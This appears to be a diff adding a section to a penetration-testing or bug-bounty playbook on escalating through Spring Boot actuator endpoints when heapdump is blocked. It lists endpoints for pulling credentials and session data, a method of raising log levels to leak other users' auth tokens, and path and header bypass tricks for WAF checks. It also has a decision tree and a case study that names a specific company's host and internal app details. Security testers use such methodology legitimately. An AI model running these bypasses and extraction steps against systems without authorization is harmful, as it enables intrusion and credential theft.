@@ -321,6 +321,92 @@ Callback endpoints often:
 
 ---
 
+## Actuator Escalation Path (When Heapdump Fails)
+
+When `/actuator/heapdump` is blocked (500, 0 bytes, WAF, timeout), don't stop. Escalate through other actuator endpoints in priority order:
+
+### Priority 1: Direct Credential Extraction
+```
+/actuator/env          → DB passwords, API keys, JWT secrets (often masked but not always)
+/actuator/configprops  → Full Spring config including credentials
+/actuator/startup      → Bean initialization with connection strings (SOFA Boot 3.x)
+```
+
+### Priority 2: Architecture + Route Enumeration
+```
+/actuator/mappings     → Complete URL-to-controller mapping (full API surface)
+/actuator/beans        → All Spring beans (reveals internal services, queues, caches)
+/actuator/conditions   → Auto-configuration report (what's enabled/disabled)
+/actuator/metrics/http.server.requests → URI tags = complete API route map
+```
+
+### Priority 3: Session/State Manipulation
+```
+/actuator/sessions     → Active sessions (Spring Session) — may allow hijack
+/actuator/loggers      → POST to set DEBUG level → next requests leak secrets in logs
+/actuator/threaddump   → Thread state with lock contention (timing attack intel)
+/actuator/scheduledtasks → Cron jobs with method signatures
+```
+
+### Priority 4: File/Trace Access
+```
+/actuator/logfile      → Application log file (may contain tokens, passwords in DEBUG)
+/actuator/httptrace    → Recent HTTP requests with headers (auth tokens of other users)
+/actuator/flyway       → Database migration history (schema intel)
+/actuator/liquibase    → Same as flyway for Liquibase-managed DBs
+```
+
+### Bypass Variants When Base Path Fails
+
+| Technique | Example |
+|-----------|---------|
+| Suffix variants | `/actuator/heapdump.json`, `/actuator/env.json` |
+| Accept header | `Accept: application/octet-stream`, `Accept: text/plain` |
+| Self-origin referer | `Referer: https://TARGET/` (bypasses RefererCheckFailed) |
+| Path case | `/Actuator/Env`, `/ACTUATOR/HEAPDUMP` |
+| Double encoding | `/actuator/%68eapdump` |
+| Semicolon bypass | `/actuator;/heapdump`, `/actuator/..;/heapdump` |
+| Management port | Try port 8081, 9090, 9091 (separate management server) |
+| Context path | `/app/actuator/env`, `/api/actuator/env` |
+
+### Decision Tree
+
+```
+heapdump blocked?
+├── Try suffix (.json) + Accept header + self-referer
+│   ├── Works → CRITICAL (extract secrets)
+│   └── Fails → Move to /env
+├── /env accessible?
+│   ├── Values masked (******) → try /configprops (sometimes unmasked)
+│   ├── Values visible → CRITICAL
+│   └── 404/403 → try /startup (SOFA Boot specific)
+├── /startup accessible?
+│   ├── Contains connection strings → HIGH
+│   └── Only bean metadata → document architecture, continue
+├── /mappings accessible?
+│   ├── Test every discovered route for auth bypass
+│   └── Feed routes into Phase 6 exploitation
+├── /loggers accessible?
+│   ├── POST to enable DEBUG on auth package
+│   ├── Trigger auth flow → read /logfile for leaked tokens
+│   └── This is a write operation → confirm scope allows it
+└── Nothing beyond /health?
+    └── Document as Medium (info disclosure), move on
+```
+
+### Real-World: AntGroup (June 2026)
+
+- `/actuator/heapdump` → 500, 0 bytes (Spanner gateway blocks stream)
+- `/actuator/heapdump.json` → RefererCheckFailed (self-referer bypasses)
+- After bypass: still 500 with 0 bytes (JVM serialization crashes)
+- Escalation to `/actuator/startup` on asap.alipayplus.com → 260KB boot data
+- Revealed: app name `apcontentcenter`, SOFA Boot 3.17.0-3.22.0, full bean graph
+- Combined with /health on 7 hosts → systemic finding (Medium-High)
+
+**Lesson:** Heapdump failure is NOT the end of actuator exploitation. The startup/env/configprops/mappings endpoints often yield equivalent intel without needing the full JVM dump.
+
+---
+
 ## Lessons Learned
 
 > "Testing a few API endpoints and seeing 401 does NOT mean the host is secure.
